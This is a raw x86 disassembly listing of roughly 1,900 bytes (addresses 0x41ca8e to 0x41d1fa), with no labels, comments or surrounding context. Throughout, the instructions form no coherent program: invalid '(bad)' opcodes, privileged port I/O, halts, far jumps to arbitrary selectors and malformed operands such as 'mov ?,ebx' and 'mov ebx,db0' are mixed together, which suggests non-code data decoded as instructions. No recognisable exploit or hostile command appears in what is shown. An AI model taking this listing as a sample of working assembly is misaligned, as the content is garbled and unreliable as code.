  41ca8e:	test   eax,0x620e98e4
  41ca93:	xchg   esp,eax
  41ca94:	mov    DWORD PTR [ebp*8+0x26fb6703],esi
  41ca9b:	lahf   
  41ca9c:	adc    edx,ebp
  41ca9e:	mov    eax,0xd3d2f26b
  41caa3:	adc    bh,ch
  41caa5:	xchg   edx,eax
  41caa6:	cld    
  41caa7:	push   0x6a
  41caa9:	add    DWORD PTR [edx+0xdd81ceb],0x7a503a94
  41cab3:	inc    ebp
  41cab4:	jne    0x41caf0
  41cab6:	je     0x41cb18
  41cab8:	imul   ecx,DWORD PTR [esi+eiz*8],0x9e519929
  41cabf:	idiv   BYTE PTR [edi-0x4297565c]
  41cac5:	js     0x41cabd
  41cac7:	inc    ebx
  41cac8:	je     0x41cabc
  41caca:	dec    edx
  41cacb:	mov    esi,0x7fcc6ffd
  41cad0:	das    
  41cad1:	jno    0x41cb31
  41cad3:	repz rcr BYTE PTR [edx],1
  41cad6:	add    esi,esp
  41cad8:	push   ebx
  41cad9:	adc    cl,ah
  41cadb:	out    dx,al
  41cadc:	jge    0x5473cd64
  41cae2:	shl    DWORD PTR [ebx+edx*2],0x4d
  41cae6:	sar    DWORD PTR [edx+ebx*8-0x4c],cl
  41caea:	(bad)  
  41caeb:	cmc    
  41caec:	fcomp  QWORD PTR [edi-0x4f]
  41caef:	pop    ebp
  41caf0:	cmp    ebx,DWORD PTR [ecx+0x44127fb3]
  41caf6:	out    dx,al
  41caf7:	imul   edi,edx,0xc
  41cafa:	mov    DWORD PTR [ebx],ebp
  41cafc:	pop    ebx
  41cafd:	dec    ebp
  41cafe:	sub    eax,0x4c7e2f46
  41cb03:	mov    esp,0x67fa2f11
  41cb08:	jno    0x41ca9d
  41cb0a:	add    eax,0xa5d14e05
  41cb0f:	sbb    eax,edi
  41cb11:	mov    WORD PTR [eax+ebx*2-0x49],gs
  41cb15:	mov    WORD PTR [edi],ds
  41cb17:	xchg   ebx,eax
  41cb18:	xchg   BYTE PTR [eax],bh
  41cb1a:	out    dx,eax
  41cb1b:	add    eax,0x9311b178
  41cb20:	inc    esp
  41cb21:	shr    DWORD PTR [edx-0x2c],cl
  41cb24:	adc    al,0xa3
  41cb26:	rcr    DWORD PTR [edi+0x2763544e],1
  41cb2c:	mov    dl,0x97
  41cb2e:	sub    bl,BYTE PTR [esi]
  41cb30:	xor    DWORD PTR [ecx],edx
  41cb32:	je     0x41cba6
  41cb34:	xchg   esp,eax
  41cb35:	mov    esp,0x21badb7f
  41cb3a:	ss das 
  41cb3c:	cs fcomip st,st(5)
  41cb3f:	pop    esp
  41cb40:	jl     0x41cac7
  41cb42:	sub    DWORD PTR [ecx-0x6],0xc7fbfe60
  41cb49:	lahf   
  41cb4a:	cmp    BYTE PTR [edi-0x6],bl
  41cb4d:	or     eax,0xb569c1f7
  41cb52:	xchg   ebp,eax
  41cb53:	jp     0x41cbac
  41cb55:	or     eax,0x73d4f2f4
  41cb5a:	cwde   
  41cb5b:	rcl    DWORD PTR [edx+0x177de10b],cl
  41cb61:	mov    ebp,0x789d4118
  41cb66:	xchg   DWORD PTR [ecx],esi
  41cb68:	xchg   ebp,eax
  41cb69:	pusha  
  41cb6a:	cmc    
  41cb6b:	inc    edi
  41cb6c:	xor    eax,0x938dfa9
  41cb71:	push   edi
  41cb72:	cmp    al,0x94
  41cb74:	pop    edi
  41cb75:	out    0xa7,al
  41cb77:	push   ebx
  41cb78:	mov    bh,0x76
  41cb7a:	and    esp,DWORD PTR [ebp-0x14]
  41cb7d:	(bad)  
  41cb7f:	or     al,0x79
  41cb81:	stos   DWORD PTR es:[edi],eax
  41cb82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cb83:	enter  0xb14b,0xca
  41cb87:	(bad)
  41cb8a:	adc    eax,0xbc1ba3e3
  41cb8f:	loope  0x41cbce
  41cb91:	hlt    
  41cb92:	ins    DWORD PTR es:[edi],dx
  41cb93:	leave  
  41cb94:	int    0xdd
  41cb96:	cmp    DWORD PTR [edi],ebx
  41cb98:	mov    ch,0xff
  41cb9a:	scas   al,BYTE PTR es:[edi]
  41cb9b:	lods   al,BYTE PTR ds:[esi]
  41cb9c:	movaps xmm6,XMMWORD PTR [ecx]
  41cb9f:	mov    bh,0x5d
  41cba1:	pop    esi
  41cba2:	pop    eax
  41cba3:	xor    esi,DWORD PTR [esi-0x5d]
  41cba6:	mov    ecx,0x39b2ddea
  41cbab:	test   eax,0xb5b11e1e
  41cbb0:	call   0xb8dfb3c5
  41cbb5:	jle    0x41cb50
  41cbb7:	mov    esi,0x85898e22
  41cbbc:	addr16 ja 0x41cb74
  41cbbf:	(bad)  
  41cbc0:	nop
  41cbc1:	arpl   WORD PTR [edi+0x22],cx
  41cbc4:	inc    ebp
  41cbc5:	inc    edi
  41cbc6:	stc    
  41cbc7:	ret    
  41cbc8:	push   eax
  41cbc9:	jmp    FWORD PTR ds:0x48874c
  41cbcf:	lods   al,BYTE PTR ds:[esi]
  41cbd0:	leave  
  41cbd1:	or     dh,BYTE PTR [edi-0x7679f735]
  41cbd7:	jne    0x41cbb4
  41cbd9:	inc    eax
  41cbda:	mov    al,0x62
  41cbdc:	mov    ebx,0xbfd93f32
  41cbe1:	das    
  41cbe2:	add    dh,BYTE PTR [ecx+eax*8]
  41cbe5:	mov    ?,ebx
  41cbe7:	pop    eax
  41cbe8:	pop    es
  41cbe9:	and    al,0x2a
  41cbeb:	mov    dh,0xb
  41cbed:	(bad)  
  41cbee:	stos   BYTE PTR es:[edi],al
  41cbef:	lahf   
  41cbf0:	lods   al,BYTE PTR ds:[esi]
  41cbf1:	stos   BYTE PTR es:[edi],al
  41cbf2:	xchg   ebp,eax
  41cbf3:	push   0xa7db4088
  41cbf8:	in     eax,dx
  41cbf9:	mov    eax,ds:0xe173c907
  41cbfe:	push   esi
  41cbff:	iret   
  41cc00:	sub    edx,edx
  41cc02:	rcl    BYTE PTR [eax-0x19],0x22
  41cc06:	push   ds
  41cc07:	sub    eax,0x8f99d3ff
  41cc0c:	scas   eax,DWORD PTR es:[edi]
  41cc0d:	mov    eax,ds:0x1124587c
  41cc12:	setno  BYTE PTR [esi]
  41cc15:	pop    es
  41cc16:	fimul  WORD PTR [ebp-0x72]
  41cc19:	test   eax,0xf94fcbd0
  41cc1e:	cmp    edx,esi
  41cc20:	mov    WORD PTR [ebp+edi*4+0x10],es
  41cc24:	sahf   
  41cc25:	xor    eax,DWORD PTR [edi+edi*8]
  41cc28:	jp     0x41cc29
  41cc2a:	(bad)  es:[edi-0x24]
  41cc2e:	mov    edi,0x4e99749e
  41cc33:	aas    
  41cc34:	sub    dl,BYTE PTR [ecx]
  41cc36:	daa    
  41cc37:	cld    
  41cc38:	jne    0x41cbd2
  41cc3a:	daa    
  41cc3b:	xchg   ecx,eax
  41cc3c:	pop    ds
  41cc3d:	icebp  
  41cc3e:	(bad)  
  41cc3f:	aaa    
  41cc40:	xchg   esp,eax
  41cc41:	jp     0x41cbd3
  41cc43:	xor    edx,edx
  41cc45:	lds    ecx,FWORD PTR [ecx]
  41cc47:	mov    ch,0x19
  41cc49:	mov    dh,0x20
  41cc4b:	or     eax,0xb920df85
  41cc50:	aaa    
  41cc51:	or     DWORD PTR [esi+0x2c50498e],0x83c23b99
  41cc5b:	ror    BYTE PTR [esi+eiz*8-0x5f],1
  41cc5f:	xor    DWORD PTR [ecx],ebp
  41cc61:	fist   WORD PTR fs:[ebx+0x37d1a5bc]
  41cc68:	mov    eax,ds:0x7fb7cba8
  41cc6d:	fs pop eax
  41cc6f:	inc    esp
  41cc70:	mov    eax,ds:0xc2e84d85
  41cc75:	js     0x41cbf9
  41cc77:	fwait
  41cc78:	aaa    
  41cc79:	fwait
  41cc7a:	imul   esi,ebp,0x12639ee6
  41cc80:	cmp    ebx,0x62ede66a
  41cc86:	scas   al,BYTE PTR es:[edi]
  41cc87:	dec    ebx
  41cc88:	or     DWORD PTR [esi],eax
  41cc8a:	mov    WORD PTR [edi],es
  41cc8c:	dec    ebp
  41cc8d:	pop    ebx
  41cc8e:	popf   
  41cc8f:	mov    ah,0x3a
  41cc91:	sar    ecx,0x13
  41cc94:	retf   
  41cc95:	push   0xffffffc4
  41cc97:	jae    0x41cce8
  41cc99:	mov    ah,0xaa
  41cc9b:	mov    es,ecx
  41cc9d:	push   ds
  41cc9e:	mov    fs,ebp
  41cca0:	repnz stc 
  41cca2:	mov    ecx,0x8e134d36
  41cca7:	sub    al,0xc5
  41cca9:	test   eax,0xcd0660e3
  41ccae:	push   ebx
  41ccaf:	scas   eax,DWORD PTR es:[edi]
  41ccb0:	in     eax,dx
  41ccb1:	mov    esi,0x4a52eac
  41ccb6:	jmp    0x55574be1
  41ccbb:	fcmovnu st,st(3)
  41ccbd:	pop    edx
  41ccbe:	jge    0x41cc69
  41ccc0:	mov    fs,edx
  41ccc2:	jle    0x41cc87
  41ccc4:	cmp    edi,DWORD PTR [eax-0x47]
  41ccc7:	mov    al,0x21
  41ccc9:	xlat   BYTE PTR ds:[ebx]
  41ccca:	loop   0x41cd07
  41cccc:	mov    ch,0x55
  41ccce:	fstp   TBYTE PTR [edi+0x56]
  41ccd1:	mov    cs,WORD PTR [eax+0x7e]
  41ccd4:	dec    eax
  41ccd5:	sbb    BYTE PTR [ebx],dh
  41ccd7:	push   cs
  41ccd8:	ss mov ebx,0xe394a096
  41ccde:	ret    0x53ed
  41cce1:	popa   
  41cce2:	hlt    
  41cce3:	xor    BYTE PTR [edx],dl
  41cce5:	push   ebp
  41cce6:	xchg   BYTE PTR [esi+0x36],ch
  41cce9:	inc    edi
  41ccea:	ror    DWORD PTR es:[edi],0x41
  41ccee:	or     ebx,0x31df344b
  41ccf4:	jno    0x41cd6a
  41ccf6:	aaa    
  41ccf7:	push   ss
  41ccf8:	mov    ebx,0xed616832
  41ccfd:	inc    edi
  41ccfe:	mul    DWORD PTR [esi-0x3f8cb6]
  41cd04:	es icebp 
  41cd06:	jmp    0xde93:0x40c0397b
  41cd0d:	jb     0x41cd61
  41cd0f:	aam    0x4b
  41cd11:	int3   
  41cd12:	cmc    
  41cd13:	outs   dx,BYTE PTR ds:[esi]
  41cd14:	retf   0x7699
  41cd17:	xchg   edi,eax
  41cd18:	dec    edi
  41cd19:	mov    eax,0xb2d04c52
  41cd1e:	test   eax,0xef89c55d
  41cd23:	retf   0x4ed6
  41cd26:	mov    esi,0x3aa982f8
  41cd2b:	ror    eax,0xc5
  41cd2e:	pop    es
  41cd2f:	sub    edi,ecx
  41cd31:	arpl   WORD PTR [eax],sp
  41cd33:	mov    WORD PTR [eax+0x64e6fb26],es
  41cd39:	out    0x80,eax
  41cd3b:	push   0xffffff92
  41cd3d:	mov    ah,0x5a
  41cd3f:	push   ds
  41cd40:	mov    ebx,DWORD PTR [esi+0x1f920c96]
  41cd46:	fcmovbe st,st(0)
  41cd48:	js     0x41cda2
  41cd4a:	das    
  41cd4b:	and    edi,eax
  41cd4d:	jmp    0x8731:0x66b66461
  41cd54:	aas    
  41cd55:	and    ecx,DWORD PTR [ecx-0x3e]
  41cd58:	ja     0x41cce7
  41cd5a:	cmp    eax,0xf58687c3
  41cd5f:	imul   esi,DWORD PTR [esi],0x29
  41cd62:	out    0x7b,al
  41cd64:	in     al,dx
  41cd65:	jnp    0x41cd14
  41cd67:	seta   BYTE PTR [ebx+0x54]
  41cd6b:	cmp    al,0xcb
  41cd6d:	das    
  41cd6e:	jg     0x41cd49
  41cd70:	pop    edx
  41cd71:	mov    cl,BYTE PTR [esp+edx*1]
  41cd74:	jge    0x41cdcd
  41cd76:	sub    BYTE PTR [ebp+0x16ad44b4],bl
  41cd7c:	iret   
  41cd7d:	stos   BYTE PTR es:[edi],al
  41cd7e:	jmp    0xeb4a7c61
  41cd83:	daa    
  41cd84:	pop    esi
  41cd85:	ficom  DWORD PTR [eax]
  41cd87:	push   ebx
  41cd88:	arpl   WORD PTR [edi],di
  41cd8a:	push   ebx
  41cd8b:	xchg   ebx,eax
  41cd8c:	dec    ebx
  41cd8d:	aad    0x98
  41cd8f:	leave  
  41cd90:	cmp    BYTE PTR [ebx-0x2],al
  41cd93:	(bad)  
  41cd94:	sti    
  41cd95:	mov    ecx,0x8e8b3b72
  41cd9a:	int3   
  41cd9b:	inc    edx
  41cd9c:	call   0x2fa1:0xd1dce044
  41cda3:	retf   
  41cda4:	scas   al,BYTE PTR es:[edi]
  41cda5:	pop    ecx
  41cda6:	cmp    al,0xec
  41cda8:	add    esi,esi
  41cdaa:	sahf   
  41cdab:	pop    esi
  41cdac:	mov    bl,0xd4
  41cdae:	cmc    
  41cdaf:	cmp    al,0xab
  41cdb1:	daa    
  41cdb2:	ds push edi
  41cdb4:	or     dh,BYTE PTR [ecx+ecx*4]
  41cdb7:	pop    ebx
  41cdb8:	mov    esi,ebx
  41cdba:	mov    dl,0x2c
  41cdbc:	sbb    eax,0xb48e96de
  41cdc1:	clc    
  41cdc2:	rcr    BYTE PTR [esi],1
  41cdc4:	mov    bh,0x48
  41cdc6:	repnz sbb ebp,DWORD PTR [esi-0x24e4ae2]
  41cdcd:	dec    edi
  41cdce:	pop    edx
  41cdcf:	xchg   ch,bh
  41cdd1:	hlt    
  41cdd2:	dec    edi
  41cdd3:	sbb    al,0x33
  41cdd5:	gs xor al,dh
  41cdd8:	push   cs
  41cdd9:	and    eax,0x6ba83ca9
  41cdde:	mov    dh,BYTE PTR [eax+0x48]
  41cde1:	jmp    0x41ce01
  41cde3:	je     0x41ce33
  41cde5:	ins    BYTE PTR es:[edi],dx
  41cde6:	out    0x4a,al
  41cde8:	add    DWORD PTR [ebp-0xf],0x74cce4d3
  41cdef:	mov    al,ds:0xf9f1b637
  41cdf4:	dec    ebp
  41cdf5:	sbb    edi,DWORD PTR [eax]
  41cdf7:	cmp    eax,0xfb84a481
  41cdfc:	push   cs
  41cdfd:	mov    ecx,0x5d267d17
  41ce02:	mov    eax,0x6374ce32
  41ce07:	cmc    
  41ce08:	cmp    DWORD PTR [ecx+0x33dec9e4],ebx
  41ce0e:	sub    DWORD PTR [esi],eax
  41ce10:	sti    
  41ce11:	add    BYTE PTR [ecx-0x1f2035ff],bl
  41ce17:	jmp    0x41ce4c
  41ce19:	imul   DWORD PTR [edi+0x704917ba]
  41ce1f:	cmp    ch,BYTE PTR [esi]
  41ce21:	push   esp
  41ce22:	pushf  
  41ce23:	inc    ebp
  41ce24:	jae    0x41ce24
  41ce26:	mov    cl,0x1e
  41ce28:	test   al,0xda
  41ce2a:	add    DWORD PTR [eax+0x8],ebx
  41ce2d:	sbb    cl,BYTE PTR fs:[ebx-0x666db726]
  41ce34:	cdq    
  41ce35:	pop    ecx
  41ce36:	sbb    al,0x40
  41ce38:	into   
  41ce39:	out    dx,al
  41ce3a:	xchg   ecx,eax
  41ce3b:	dec    esi
  41ce3c:	mov    bh,0xd9
  41ce3e:	cmp    ch,BYTE PTR [edi]
  41ce40:	inc    ebp
  41ce41:	mov    WORD PTR [ebx-0x70a2003e],ds
  41ce47:	es xchg esp,eax
  41ce49:	sbb    BYTE PTR [ebp+0x57808226],0x25
  41ce50:	sbb    al,0x7b
  41ce52:	mov    BYTE PTR [eax+0xcef9205],bl
  41ce58:	add    DWORD PTR [edx-0x63872310],ebp
  41ce5e:	inc    ebp
  41ce5f:	(bad)  
  41ce60:	in     al,dx
  41ce61:	xor    cl,ah
  41ce63:	push   ebp
  41ce64:	jmp    0xa62c:0x956658d6
  41ce6b:	outs   dx,DWORD PTR ds:[esi]
  41ce6c:	mov    ch,0xe1
  41ce6e:	into   
  41ce6f:	test   eax,0xf7bccde5
  41ce74:	das    
  41ce75:	lock mov BYTE PTR ss:[ecx-0x2],ch
  41ce7a:	push   eax
  41ce7b:	adc    DWORD PTR [edi-0x405eab28],edi
  41ce81:	or     al,0xb5
  41ce83:	and    ch,BYTE PTR [ebx+ebx*4]
  41ce86:	xor    edx,DWORD PTR [edi-0x7177a207]
  41ce8c:	inc    ebp
  41ce8d:	xchg   edx,eax
  41ce8e:	sbb    eax,0x65cc1c92
  41ce93:	mov    eax,ds:0x711882a0
  41ce98:	sub    eax,0x97d806ec
  41ce9d:	pop    edx
  41ce9e:	add    DWORD PTR [eiz*8-0xa0ab833],ebx
  41cea5:	pop    edi
  41cea6:	ja     0x41ceb6
  41cea8:	(bad)  
  41cea9:	push   esi
  41ceaa:	mov    bh,al
  41ceac:	sub    esi,DWORD PTR [ecx-0x5b]
  41ceaf:	pop    esp
  41ceb0:	and    BYTE PTR [edx+0x549414a4],ah
  41ceb6:	or     al,0x29
  41ceb8:	push   ds
  41ceb9:	mov    ch,0xeb
  41cebb:	mov    eax,ds:0x859027ce
  41cec0:	pop    esi
  41cec1:	xlat   BYTE PTR ds:[ebx]
  41cec2:	adc    edx,DWORD PTR [ebx-0x66]
  41cec5:	cmc    
  41cec6:	popa   
  41cec7:	push   DWORD PTR [esi]
  41cec9:	loopne 0x41ce95
  41cecb:	xchg   DWORD PTR [ebp+eax*4+0xa522030],ebx
  41ced2:	in     eax,0x54
  41ced4:	dec    ebx
  41ced5:	mov    al,ds:0x3cc3f29c
  41ceda:	jp     0x41cf39
  41cedc:	push   ebx
  41cedd:	fisubr WORD PTR fs:[edi+0x4865d6e3]
  41cee4:	scas   al,BYTE PTR es:[edi]
  41cee5:	ss pmaxsw mm3,mm7
  41cee9:	pop    edi
  41ceea:	xchg   BYTE PTR [esi],cl
  41ceec:	icebp  
  41ceed:	sub    ebp,DWORD PTR ds:[ebp+0x44]
  41cef1:	cmp    edi,DWORD PTR [esi]
  41cef3:	pop    edx
  41cef4:	mov    ch,BYTE PTR [eax-0x66]
  41cef7:	loope  0x41cf4e
  41cef9:	ror    DWORD PTR [eax],0x63
  41cefc:	and    al,0x46
  41cefe:	mov    ds:0x437393c0,al
  41cf03:	sub    DWORD PTR [ebp-0x95f4857],edx
  41cf09:	add    al,0x2f
  41cf0b:	mov    edi,0xd5969fbe
  41cf10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cf11:	call   0x5d96:0x310b1515
  41cf18:	(bad)  
  41cf19:	cmp    ah,BYTE PTR [eax]
  41cf1b:	sbb    DWORD PTR [eax-0x90861d4],0x45
  41cf22:	cmp    eax,0xe97afbdd
  41cf27:	add    DWORD PTR [ebp+0x56],esp
  41cf2a:	add    ch,dl
  41cf2c:	push   edx
  41cf2d:	dec    ebp
  41cf2e:	xor    BYTE PTR [ecx-0x52],dh
  41cf31:	pop    edx
  41cf32:	mov    esi,0xd25d273c
  41cf37:	sbb    ebx,esi
  41cf39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cf3a:	ins    DWORD PTR es:[edi],dx
  41cf3b:	xor    DWORD PTR [ecx],0xffffff93
  41cf3e:	jp     0x41ced4
  41cf40:	cdq    
  41cf41:	sahf   
  41cf42:	xchg   esp,eax
  41cf43:	sub    DWORD PTR [edx],0x8fc455ef
  41cf49:	addr16 call 0xb8fa:0xfc1c248d
  41cf51:	jmp    0x382c759a
  41cf56:	lods   al,BYTE PTR ds:[esi]
  41cf57:	fadd   QWORD PTR [edi+0x559af0d3]
  41cf5d:	mov    DWORD PTR [ebx+0x47f52421],esp
  41cf63:	and    BYTE PTR fs:[ecx+0x3a0276c9],bl
  41cf6a:	ins    BYTE PTR es:[edi],dx
  41cf6b:	or     DWORD PTR [esi],eax
  41cf6d:	das    
  41cf6e:	stos   BYTE PTR es:[edi],al
  41cf6f:	adc    BYTE PTR [esi],al
  41cf71:	jnp    0x41cf2e
  41cf73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cf74:	aaa    
  41cf75:	dec    eax
  41cf76:	add    DWORD PTR [edi+0x4875d053],edi
  41cf7c:	fucomi st,st(2)
  41cf7e:	jl     0x41cfb5
  41cf80:	fwait
  41cf81:	out    0x7,eax
  41cf83:	xchg   ebp,eax
  41cf84:	lea    esp,[ebx+ebp*2+0x4c233cc3]
  41cf8b:	dec    ecx
  41cf8c:	or     al,0x1
  41cf8e:	dec    eax
  41cf8f:	xchg   esi,eax
  41cf90:	sbb    ah,BYTE PTR [edx+0x525034aa]
  41cf96:	(bad)  
  41cf97:	out    dx,al
  41cf98:	xchg   edx,esi
  41cf9a:	call   0x505e:0xe2ee205b
  41cfa1:	repnz loop 0x41cfd0
  41cfa4:	cmp    DWORD PTR [ebp+ebp*4+0x3c],0xfffffff9
  41cfa9:	rol    DWORD PTR [esi+0xe],1
  41cfac:	dec    edx
  41cfad:	dec    esp
  41cfae:	dec    edi
  41cfaf:	mov    WORD PTR [edx],es
  41cfb1:	push   esi
  41cfb2:	rol    DWORD PTR ss:[ebx+eax*2+0x44],1
  41cfb7:	push   ecx
  41cfb8:	jge    0x41cf8a
  41cfba:	mov    WORD PTR [esi],?
  41cfbc:	out    dx,al
  41cfbd:	ror    DWORD PTR [ebx-0x768e6c1],1
  41cfc3:	mov    eax,0xf6887df5
  41cfc8:	pop    ecx
  41cfc9:	sub    eax,0x66769425
  41cfce:	mov    eax,?
  41cfd0:	xchg   esi,eax
  41cfd1:	daa    
  41cfd2:	loope  0x41cf77
  41cfd4:	push   eax
  41cfd5:	jp     0x41cfd8
  41cfd7:	lods   eax,DWORD PTR ds:[esi]
  41cfd8:	mul    BYTE PTR [eax]
  41cfda:	retf   
  41cfdb:	pop    ecx
  41cfdc:	fwait
  41cfdd:	sbb    al,BYTE PTR [eax-0x76]
  41cfe0:	loop   0x41cf9b
  41cfe2:	mov    ebx,db0
  41cfe5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cfe6:	(bad)  
  41cfe8:	xlat   BYTE PTR ds:[ebx]
  41cfe9:	pop    esi
  41cfea:	shl    BYTE PTR [esi+esi*2],0x74
  41cfee:	push   esi
  41cfef:	xchg   ebx,eax
  41cff0:	ja     0x41d06e
  41cff2:	add    DWORD PTR [esi],eax
  41cff4:	lds    ecx,FWORD PTR [edi-0x1b0bc873]
  41cffa:	das    
  41cffb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cffc:	pop    eax
  41cffd:	(bad)  
  41cffe:	push   ebp
  41cfff:	jno    0x41cffa
  41d001:	adc    DWORD PTR [ebx-0x6f],esi
  41d004:	sub    BYTE PTR [esi+0x659241cb],0xa0
  41d00b:	adc    edx,DWORD PTR [esi-0x16]
  41d00e:	push   ecx
  41d00f:	push   edx
  41d010:	sbb    BYTE PTR [eax],0x8b
  41d013:	out    dx,eax
  41d014:	loope  0x41d07a
  41d016:	mov    bh,0x3f
  41d018:	sub    eax,0xf51d2167
  41d01d:	in     eax,dx
  41d01e:	sbb    DWORD PTR [esp+edi*8],ecx
  41d021:	scas   al,BYTE PTR es:[edi]
  41d022:	mov    ds:0x6bc65878,eax
  41d027:	pop    edx
  41d028:	mov    esp,0xe477dccd
  41d02d:	xchg   ebp,edx
  41d02f:	xchg   edi,eax
  41d030:	sbb    al,0xcf
  41d032:	ins    WORD PTR es:[edi],dx
  41d034:	jbe    0x41d04d
  41d036:	mov    eax,0x20bc7a7c
  41d03b:	scas   eax,DWORD PTR es:[edi]
  41d03c:	repnz xor ebx,eax
  41d03f:	pushf  
  41d040:	test   eax,0xbf7bc7ad
  41d045:	mov    DWORD PTR [ebp-0x2a1cea6a],ebx
  41d04b:	mov    WORD PTR [edx-0x2],fs
  41d04e:	mov    dh,0x43
  41d050:	jno    0x41d0aa
  41d052:	test   al,0xf8
  41d054:	lea    edx,[esi+0x2b]
  41d057:	pop    es
  41d058:	icebp  
  41d059:	aad    0xbf
  41d05b:	jnp    0x41d068
  41d05d:	test   BYTE PTR [edi+eax*4],dh
  41d060:	jnp    0x41cfe8
  41d062:	mov    eax,ds:0x11498b79
  41d067:	inc    esi
  41d068:	mov    eax,ds:0xae36c347
  41d06d:	or     eax,0xa19c718c
  41d072:	mov    esi,0x47df20f
  41d077:	pop    ds
  41d078:	in     al,dx
  41d079:	cwde   
  41d07a:	xor    esp,ebp
  41d07c:	ror    DWORD PTR [ebp+0x29],0xd4
  41d080:	xchg   BYTE PTR [edx-0x42],dl
  41d083:	shl    esp,0x45
  41d086:	mov    BYTE PTR [edi+0x12a3f7ee],dl
  41d08c:	sbb    eax,0xa59c2bc3
  41d091:	and    eax,0xe349eb56
  41d096:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d098:	ret    0xc7c9
  41d09b:	mov    ecx,0x2262b8f2
  41d0a0:	mov    cl,BYTE PTR ds:0xbbf9c61
  41d0a6:	ds push edi
  41d0a8:	jae    0x41d105
  41d0aa:	adc    eax,0xc5865150
  41d0af:	ins    DWORD PTR es:[edi],dx
  41d0b0:	rol    BYTE PTR [esi-0x69],0x1f
  41d0b4:	xchg   edx,eax
  41d0b5:	mov    al,0x9a
  41d0b7:	add    al,0x84
  41d0b9:	aam    0xc4
  41d0bb:	and    eax,0xf06fb2d2
  41d0c0:	add    al,0x84
  41d0c2:	test   BYTE PTR [eax-0xa],bh
  41d0c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d0c6:	pop    eax
  41d0c7:	push   ebp
  41d0c8:	push   eax
  41d0c9:	inc    ebx
  41d0ca:	push   0x3156801e
  41d0cf:	arpl   sp,bp
  41d0d1:	out    dx,al
  41d0d2:	shl    edi,cl
  41d0d4:	shl    BYTE PTR [esi],cl
  41d0d6:	jo     0x41d069
  41d0d8:	aaa    
  41d0d9:	jecxz  0x41d118
  41d0db:	shl    DWORD PTR [ebx],1
  41d0dd:	fcom   QWORD PTR [edi+0x28]
  41d0e0:	push   es
  41d0e1:	or     eax,0xfed8541f
  41d0e6:	mov    ecx,0xfedd2c5b
  41d0eb:	cmp    eax,0x3b760483
  41d0f0:	jae    0x41d0a4
  41d0f2:	jne    0x41d137
  41d0f4:	clc    
  41d0f5:	jge    0x41d148
  41d0f7:	xchg   DWORD PTR [edi+esi*2+0x64afe5e1],esp
  41d0fe:	sahf   
  41d0ff:	cwde   
  41d100:	js     0x41d093
  41d102:	test   bl,0x7
  41d105:	inc    eax
  41d106:	mov    ecx,0x90563856
  41d10b:	out    0xd8,eax
  41d10d:	pusha  
  41d10e:	sbb    eax,0x70c145df
  41d113:	dec    esi
  41d114:	outs   dx,DWORD PTR ds:[esi]
  41d115:	aam    0xd4
  41d117:	adc    al,0xbc
  41d119:	or     DWORD PTR [ebx+edi*8-0x59],esi
  41d11d:	mov    DWORD PTR [edx+0x55],0x580d5586
  41d124:	mov    ds:0x6c03d03d,eax
  41d129:	mov    edx,0x47652cc8
  41d12e:	mov    ecx,0xe2a6e2de
  41d133:	push   ss
  41d134:	mov    ds:0xf4b921f2,al
  41d139:	push   ss
  41d13a:	lahf   
  41d13b:	(bad)  
  41d13c:	in     eax,0xb
  41d13e:	stos   DWORD PTR es:[edi],eax
  41d13f:	(bad)  
  41d140:	mov    eax,ds:0xf3a34688
  41d145:	xchg   edx,eax
  41d146:	cmp    DWORD PTR [ebx-0x54],0x4e
  41d14a:	nop
  41d14b:	sbb    BYTE PTR ds:0x341fa9bb,ch
  41d151:	lock or BYTE PTR [edx-0x34],dl
  41d155:	cwde   
  41d156:	dec    edi
  41d157:	mov    al,ds:0x10b971f8
  41d15c:	push   ebp
  41d15d:	or     BYTE PTR [ebx-0x60],0x70
  41d161:	test   eax,0x57f28ab0
  41d166:	jmp    0x41d1d5
  41d168:	daa    
  41d169:	test   BYTE PTR [ecx+0x1],0xbf
  41d16d:	int    0x5
  41d16f:	in     al,dx
  41d170:	ins    DWORD PTR es:[edi],dx
  41d171:	popf   
  41d172:	jecxz  0x41d118
  41d174:	xor    cl,BYTE PTR [ebp+0x9]
  41d177:	dec    edx
  41d178:	sbb    al,BYTE PTR [ecx]
  41d17a:	stos   DWORD PTR es:[edi],eax
  41d17b:	cmp    ebx,DWORD PTR [edi+0x5d1cb53b]
  41d181:	pop    ds
  41d182:	repnz lahf 
  41d184:	inc    ebx
  41d185:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d186:	imul   BYTE PTR [edx]
  41d188:	mov    ebp,0xb034a092
  41d18d:	fstp   DWORD PTR [edx]
  41d18f:	or     eax,0xff498d82
  41d194:	sub    cl,BYTE PTR [eax+0x72a16887]
  41d19a:	rcr    DWORD PTR [eax+0x552b865d],1
  41d1a0:	mov    cs,WORD PTR [edi-0x12726e67]
  41d1a6:	clc    
  41d1a7:	inc    ebx
  41d1a8:	mov    ds:0x3582e4e4,eax
  41d1ad:	inc    edi
  41d1ae:	fadd   st,st(3)
  41d1b0:	test   BYTE PTR [edx],bh
  41d1b2:	scas   al,BYTE PTR es:[edi]
  41d1b3:	add    eax,DWORD PTR [esi-0x63]
  41d1b6:	cmovp  esp,DWORD PTR [ebx+ecx*4+0xbda6ed8]
  41d1be:	aas    
  41d1bf:	cli    
  41d1c0:	js     0x41d1b9
  41d1c2:	pop    ebx
  41d1c3:	add    eax,0x2c19f53d
  41d1c8:	jp     0x41d22b
  41d1ca:	ret    
  41d1cb:	(bad)  
  41d1cc:	and    al,0xa4
  41d1ce:	scas   al,BYTE PTR es:[edi]
  41d1cf:	add    eax,0x3d6771bd
  41d1d4:	dec    ecx
  41d1d5:	lea    ebx,[ebx+0x5c8df016]
  41d1db:	push   esi
  41d1dc:	shl    BYTE PTR [ecx+0x557d1b2a],1
  41d1e2:	jo     0x41d192
  41d1e4:	push   edi
  41d1e5:	sub    BYTE PTR [ecx+esi*2-0x2e84dfba],dl
  41d1ec:	jae    0x41d1a7
  41d1ee:	(bad)  
  41d1ef:	xchg   esp,eax
  41d1f0:	les    esi,FWORD PTR [edx+0x7a99cb08]
  41d1f6:	cmp    edi,DWORD PTR [eax]
  41d1f8:	out    0x15,al
  41d1fa:	call   0x16a1:0xd175f86a
